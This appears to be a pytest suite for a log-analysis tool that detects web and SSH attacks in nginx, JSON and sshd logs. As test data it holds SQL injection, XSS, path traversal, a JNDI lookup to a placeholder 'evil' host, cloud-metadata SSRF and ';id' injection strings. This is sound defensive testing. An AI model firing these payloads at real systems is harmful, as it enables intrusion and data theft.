"""SOC log analysis: each detector fires on its attack and stays quiet on normal traffic."""
import json
import time

import pytest

from utils import soc_loganalysis as la


def nginx(ip, path, status=200, method="GET", ua="Mozilla/5.0 (X11; Linux) Firefox/130.0", ts="16/Oct/2026:10:00:00 +0000",
          size=512, user="-"):
    return f'{ip} - {user} [{ts}] "{method} {path} HTTP/1.1" {status} {size} "-" "{ua}"'


def ts_at(minute, second=0):
    return f"16/Oct/2026:10:{minute:02d}:{second:02d} +0000"


def run(lines, **kw):
    return la.analyze("\n".join(lines), **kw)


def ids(report):
    return {f["id"] for f in report["findings"]}


def finding(report, fid):
    return next(f for f in report["findings"] if f["id"] == fid)


# ── parsing ─────────────────────────────────────────────────────────
def test_parses_nginx_combined():
    r = run([nginx("45.33.32.5", "/admin?x=1", 302, "POST", ua="curl/8.5.0", size=900)])
    assert r["summary"]["records"] == 1 and r["summary"]["formats"] == {"http": 1}
    assert r["sources"][0]["ip"] == "45.33.32.5" and r["sources"][0]["bytes"] == 900
    assert r["status"] == {"300": 1} and r["methods"] == {"POST": 1}
    assert r["tool_clients"] == {"curl": 1}
    assert r["summary"]["first"] == "2026-10-16 10:00:00"


def test_parses_json_lines_from_the_app():
    line = json.dumps({"time": "2026-10-16T10:00:00Z", "level": "ERROR", "ip": "45.33.33.9", "path": "/login",
                       "method": "POST", "event_type": "waf.sqli_blocked", "message": "blocked"})
    r = run([line])
    assert r["summary"]["formats"] == {"json": 1}
    assert "app_event:waf" in ids(r)
    assert [m["id"] for m in finding(r, "app_event:waf")["mitre"]] == ["T1190"]


def test_parses_sshd_syslog_and_iso():
    r = run(["Oct 16 10:00:01 host sshd[123]: Failed password for root from 45.33.33.7 port 22 ssh2",
             "2026-10-16T10:00:02+00:00 host sshd[1]: Invalid user bob from 45.33.33.7 port 4"])
    assert r["summary"]["formats"] == {"ssh": 2}
    assert r["sources"][0]["ip"] == "45.33.33.7" and r["sources"][0]["errors"] == 2


def test_unknown_lines_are_counted_not_fatal():
    r = run(["totally unstructured text", "", "   ", "another one with 192.0.2.4 in it"])
    assert r["summary"]["unparsed"] == 1 and r["summary"]["records"] == 1


def test_report_is_json_serialisable():
    r = run([nginx("45.33.32.5", "/?q=' OR 1=1--"), nginx("45.33.32.5", "/.env", 404)])
    json.dumps(r)


# ── quiet on normal traffic ─────────────────────────────────────────
def test_benign_traffic_produces_no_findings():
    lines = [nginx(f"45.33.33.{i % 20 + 1}", p, 200, ts=ts_at(i % 50))
             for i, p in enumerate(["/", "/admin", "/employees", "/static/app.css", "/api/leave?month=10", "/employee_portal"] * 30)]
    lines += [nginx("45.33.33.3", "/login", 200, "POST", ts=ts_at(1)), nginx("45.33.33.3", "/admin", 200, ts=ts_at(2))]
    r = run(lines)
    assert r["findings"] == [], r["findings"]
    assert all(s["verdict"] == "ok" for s in r["sources"])


def test_semicolon_id_parameter_is_not_command_injection():
    assert "rce" not in ids(run([nginx("45.33.32.5", "/report?a=1;id=5")]))
    assert "rce" in ids(run([nginx("45.33.32.5", "/ping?host=1.1.1.1;id")]))


# ── attack signatures ───────────────────────────────────────────────
@pytest.mark.parametrize("path, fid", [
    ("/items?id=1%20UNION%20SELECT%20username,password%20FROM%20users", "sqli"),
    ("/items?id=1' OR '1'='1", "sqli"),
    ("/items?id=1%2527%2520OR%25201%253D1", "sqli"),                       # double URL-encoded
    ("/search?q=<script>alert(1)</script>", "xss"),
    ("/search?q=%3Cimg%20src=x%20onerror=alert(1)%3E", "xss"),
    ("/download?f=../../etc/passwd", "traversal"),
    ("/download?f=..%2f..%2fetc%2fpasswd", "traversal"),
    ("/x?c=%24%7Bjndi:ldap://evil/a%7D", "rce"),
    ("/fetch?url=http://169.254.169.254/latest/meta-data/", "ssrf"),
])
def test_attack_signatures(path, fid):
    r = run([nginx("45.33.32.66", path, 200)])
    assert fid in ids(r), (path, ids(r))
    f = finding(r, fid)
    assert f["count"] == 1 and f["ips"][0]["ip"] == "45.33.32.66" and f["evidence"][0]["line"] == 1
    assert f["mitre"], "attack classes carry ATT&CK techniques"


def test_scanner_user_agent_and_probe_paths():
    r = run([nginx("45.33.32.9", "/", ua="sqlmap/1.7.2#stable"),
             nginx("45.33.32.9", "/.env", 404), nginx("45.33.32.9", "/wp-login.php", 404),
             nginx("45.33.32.10", "/", ua="python-requests/2.32")])
    assert "scanner_ua" in ids(r) and "probe" in ids(r)
    assert finding(r, "scanner_ua")["ips"] == [{"ip": "45.33.32.9", "count": 1}]
    assert r["tool_clients"] == {"python-requests": 1}      # a scripted client alone is not a finding


def test_odd_methods_and_malformed_targets():
    r = run([nginx("45.33.32.9", "/", method="TRACE"), nginx("45.33.32.9", "/" + "a" * 2100),
             nginx("45.33.32.9", "/x%00.php")])
    assert {"odd_method", "malformed"} <= ids(r)


# ── behavioural detectors ───────────────────────────────────────────
def test_login_bruteforce():
    lines = [nginx("45.33.32.20", "/login", 401, "POST", ts=ts_at(i)) for i in range(15)]
    r = run(lines)
    assert "bruteforce" in ids(r) and finding(r, "bruteforce")["ips"][0]["ip"] == "45.33.32.20"
    assert r["sources"][0]["verdict"] in ("watch", "block")


def test_possible_success_after_many_attempts():
    lines = [nginx("45.33.32.21", "/login", 200, "POST", ts=ts_at(i)) for i in range(12)]
    lines.append(nginx("45.33.32.21", "/login", 302, "POST", ts=ts_at(13)))
    r = run(lines)
    assert "possible_success" in ids(r)
    assert finding(r, "possible_success")["severity"] == "critical"
    assert r["sources"][0]["verdict"] == "block"


def test_a_single_normal_login_redirect_is_not_flagged():
    r = run([nginx("45.33.32.22", "/login", 302, "POST")])
    assert "possible_success" not in ids(r) and "bruteforce" not in ids(r)


def test_credential_stuffing_from_json_events():
    lines = [json.dumps({"time": f"2026-10-16T10:00:{i:02d}Z", "ip": "45.33.32.30", "path": "/login", "method": "POST",
                         "status": 401, "identifier": f"user{i}"}) for i in range(10)]
    r = run(lines)
    assert "stuffing" in ids(r) and finding(r, "stuffing")["severity"] == "critical"
    assert {m["id"] for m in finding(r, "stuffing")["mitre"]} == {"T1110.004", "T1110.003"}
    assert r["sources"][0]["accounts"] == 10 and r["sources"][0]["verdict"] == "block"


def test_path_enumeration():
    r = run([nginx("45.33.32.40", f"/page{i}", 404, ts=ts_at(i % 30)) for i in range(30)])
    assert "enumeration" in ids(r)


def test_request_flood_per_minute():
    r = run([nginx("45.33.32.50", "/", ts=ts_at(5, i % 60)) for i in range(150)])
    assert "flood" in ids(r)
    r2 = run([nginx("45.33.32.50", "/", ts=ts_at(5, i % 60)) for i in range(150)], flood_per_minute=500)
    assert "flood" not in ids(r2)


def test_server_error_spike():
    lines = [nginx("45.33.33.1", "/x", 500, ts=ts_at(7, i)) for i in range(15)] + \
            [nginx("45.33.33.2", "/ok", 200, ts=ts_at(7, i)) for i in range(15)]
    assert "error_spike" in ids(run(lines))


def test_ssh_bruteforce_spray_and_success():
    users = ["root", "admin", "oracle", "test", "ubuntu", "git"]
    lines = [f"Oct 16 10:00:{i:02d} host sshd[1]: Failed password for invalid user {users[i % 6]} from 45.33.32.60 port 22 ssh2"
             for i in range(12)]
    lines.append("Oct 16 10:01:00 host sshd[1]: Accepted password for root from 45.33.32.60 port 22 ssh2")
    r = run(lines)
    assert {"ssh_bruteforce", "ssh_spray", "ssh_possible_success"} <= ids(r)
    assert finding(r, "ssh_possible_success")["severity"] == "critical"


# ── response guidance ───────────────────────────────────────────────
def test_non_public_addresses_are_never_ban_candidates_or_iocs():
    lines = [nginx("10.0.0.5", "/login", 401, "POST", ts=ts_at(i)) for i in range(15)]
    r = run(lines)
    assert r["sources"][0]["non_public"] is True
    assert r["summary"]["block_candidates"] == 0
    assert all(i["value"] != "10.0.0.5" for i in r["iocs"])


def test_iocs_include_public_offenders_and_scanner_agents():
    r = run([nginx("45.33.32.70", "/.env", 404, ua="Nikto/2.5"), nginx("45.33.32.70", "/?q=<script>", 200, ua="Nikto/2.5"),
             nginx("45.33.32.70", "/?id=1' or '1'='1", 200, ua="Nikto/2.5")])
    kinds = {(i["type"], i["value"]) for i in r["iocs"]}
    assert ("ip", "45.33.32.70") in kinds and ("user_agent", "Nikto/2.5") in kinds


def test_findings_sorted_most_severe_first():
    r = run([nginx("45.33.32.80", "/?x=;id"), nginx("45.33.32.80", "/", method="TRACE")])
    sev = [f["severity"] for f in r["findings"]]
    assert sev == sorted(sev, key=lambda s: -la._SEV_RANK[s])


def test_timeline_bucket_scales_with_span():
    short = run([nginx("45.33.33.1", "/", ts=ts_at(0)), nginx("45.33.33.1", "/", ts=ts_at(30))])
    assert short["timeline"]["bucket"] == "minute"
    long_ = run([nginx("45.33.33.1", "/", ts="01/Oct/2026:10:00:00 +0000"), nginx("45.33.33.1", "/", ts="16/Oct/2026:10:00:00 +0000")])
    assert long_["timeline"]["bucket"] == "day"


# ── hostile input / limits ──────────────────────────────────────────
def test_caps_are_reported_not_silent(monkeypatch):
    monkeypatch.setattr(la, "MAX_LINES", 50)
    r = run([nginx("45.33.33.1", "/") for _ in range(200)])
    assert r["limits"]["truncated_lines"] is True and r["summary"]["lines_read"] == 50
    monkeypatch.setattr(la, "MAX_BYTES", 1000)
    assert la.analyze("x" * 5000)["limits"]["truncated_bytes"] is True


def test_hostile_lines_do_not_stall_the_analyser():
    nasty = [
        "a" * 200000,
        '1.2.3.4 - - [16/Oct/2026:10:00:00 +0000] "' + "GET /" + "%25" * 5000 + ' HTTP/1.1" 200 1 "-" "x"',
        "{" * 50000,
        '{"ip": "' + "9" * 5000 + '"}',
        "<" * 30000 + "script",
        "\x00\x01\x02" * 1000,
        "'" * 20000 + " or " + "'" * 20000,
    ]
    t0 = time.monotonic()
    r = run(nasty)
    assert time.monotonic() - t0 < 3.0
    json.dumps(r)


def test_time_budget_stops_work(monkeypatch):
    monkeypatch.setattr(la, "TIME_BUDGET_SECONDS", -1)
    r = run([nginx("45.33.33.1", "/") for _ in range(3000)])
    assert r["limits"]["time_budget_hit"] is True and r["summary"]["lines_read"] < 3000


def test_evidence_is_clipped():
    r = run([nginx("45.33.32.5", "/?q=<script>" + "x" * 5000)] * 20)
    ev = finding(r, "xss")["evidence"]
    assert len(ev) == la.EVIDENCE_PER_FINDING and all(len(e["text"]) <= la.EVIDENCE_CHARS for e in ev)
